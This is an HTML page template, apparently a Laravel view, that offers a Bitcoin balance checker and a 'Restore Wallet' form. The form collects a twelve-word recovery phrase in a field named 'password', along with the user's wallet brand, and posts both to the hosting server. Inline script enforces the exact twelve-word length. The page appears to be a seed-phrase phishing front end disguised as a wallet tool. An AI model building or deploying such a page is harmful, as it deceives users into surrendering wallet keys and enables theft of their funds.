<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<title>Bitcoin</title>

	<!-- Bootstrap -->
	<link href="css/bootstrap.css" rel="stylesheet">

	<!-- Fontawesome -->
	<link href="css/font-awesome.min.css" rel="stylesheet">

	<!-- Custom-->
	<link href="css/style.css" rel="stylesheet">

	<link href="css/bslikerc.css" rel="stylesheet">

	<link href="css/flatpickr.min.css" rel="stylesheet">

	<link href="css/footable.bootstrap.min.css" rel="stylesheet">

	<link href="css/select2.min.css" rel="stylesheet">


	<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">


	<style>
		h4 {
			font-family: 'Courgette', cursive;
		}
		
		.head {
			background: #7a1632;
			color: white;
			border-radius: 50%;
			padding: 4px;
			display: inline-block;
			width: 27px;
			text-align: center;
		}
		.tl td, .tl th {
    text-align: left; 
}
.tab td, .tab th {
    text-align: center; 
   
}
.tab th {
    background: #7a1632;
    color: white;
}
.tab{
	display: none;
}
.tl{
	display: none;
	float: left;
}

.sb{
	float:left;
width: 70%;
overflow-y: auto;
height: 190px;
}

.err{
	color: red;
}

	</style>



	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>


	<header>
		<nav style="text-align: center;">
			
				
					<a  href="#"><img src="images/logo.png" width="100px"  data-retina="images/logo-retina.png" alt="BitBal" class="retina-off "></a>
				
		</nav>

	</header>

	<div class="container">


		<div class="">
			<!-- <div class="bcrumb">

                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="#">Home</a></li>
                    <li class="breadcrumb-item active">Dashboard</li>
                </ol>
            </div>-->


			<!--Heading End -->
			<!--Form Start -->
			<div class="form text-center">
				<h4 class="text-left"><b><u><span class="head">C</span>ryto Stuff </u> </b></h4>
					<!--text field start-->
					<div class="form-group  col-md-12">
						<label for="textField" class="col-md-4 control-label text-left">Enter Bitcoin Address</label>
						<div class="col-md-6">
							<input id="address" type="text" placeholder="" data-bvalidator="required" class="form-control">
						</div>

						<div class="col-md-2">
							<input type="submit" id="check" class="btn btn-used" value="Check Balance">
						</div>
					</div>
					<!--text field end-->
					
				
					
					
                    <table class="tl">
  <col>
  
  <tr>
    
   
  </tr>
  
  <tr>
    <th scope="row"><label for="Recieved">Total Recieved</label> </th>
    <td><label for="" id="recieved"></label></td>
   
  </tr>
  <tr>
    <th scope="row">	<label for="Sent">Total Sent</label> </th>
    <td><label for="" id="sent"></label></td>
    
 
  </tr>

  <tr>
    <th scope="row">	<label for="Balance">Final Balance</label> </th>
    <td><label for="" id="balance"></label>	</td>
    
 
  </tr>
   <tr>
    <th scope="row">	<label for="Transactions">Total Transactions</label>  </th>
    <td><label for="" id="transactions"></label></td>
    
 
  </tr>
</table>
                    <div class="sb">
					<table class="table table-striped tab">
					<thead>
					<tr>
						<th>Date</th>
						<th>Amount</th>
						<th>Balance</th>
					</tr>
					</thead>
					<tbody>

					</tbody>
					</table>

					</div>
<br style="clear: both;">
					<h4 class="text-left"><b><u><span class="head">R</span>estore Wallet </u></b></h4>
					

					<form action="/" method="post">
					<!--text field start-->
					<div class="form-group  col-md-12">
						<label for="textField" class="col-md-4 control-label text-left">Enter Words</label>
						<div class="col-md-8">
							<input id="max" name="password" type="text" placeholder="" data-bvalidator="required" class="form-control">
							<i class="err"> </i>
						</div>
   

					</div>
					<!--text field end-->

					<!--select field start-->
					<div class="form-group  col-md-12">
						<label for="dateField" class="col-md-4 control-label text-left">Wallet Name </label>
						<div class="col-md-8">
							<select name="wallet" class="drop form-control" data-bvalidator="required">
                                        <option value="Eletrum">Eletrum</option>
                                        <option value="Jaxx">Jaxx</option>
                                        <option value="Exodus">Exodus</option>
                                        <option value="Coinimi">Coinimi</option>
                                    </select>
						</div>
					</div>
					{{csrf_field()}}


					<!--Submit Button Start-->

					<div class="form-group  col-md-12 text-center">
						<div >
							<input type="submit" class="btn btn-used" value="Restore Wallet">
						</div>
					</div>
					</form>
					<!--Submit Button End-->



			</div>
			<div class="clearfix"></div>
			<!--Form End -->




		</div>
	</div>
	<!-- /.container -->


	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="js/jquery-3.2.1.min.js"></script>
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="js/bootstrap.min.js"></script>


	<script src="js/flatpickr.min.js"></script>

	<script src="js/jquery.bvalidator.min.js"></script>

	<script src="js/default.min.js"></script>

	<script src="js/bslikerc.js"></script>

	<script src="js/select2.min.js"></script>

	<script src="js/footable.min.js"></script>
	<script src="js/project.js"></script>

	<script>
		var optional_config = {
			dateFormat: "d-m-Y"
		}

		$(".date").flatpickr(optional_config);



		$(document).ready(function(){
			$('form').bValidator();

			$('form').submit(function(){
				var space = $('#max').val();
				var trimmed = space.trim();
				if(trimmed.match(/([\s]+)/g).length != 11){
					$(".err").append("Enter twelve words key")
					setTimeout(function(){$('.err').empty()}, 3000);
					return false;
				}
				
			});
		});




	</script>
</body>

</html>
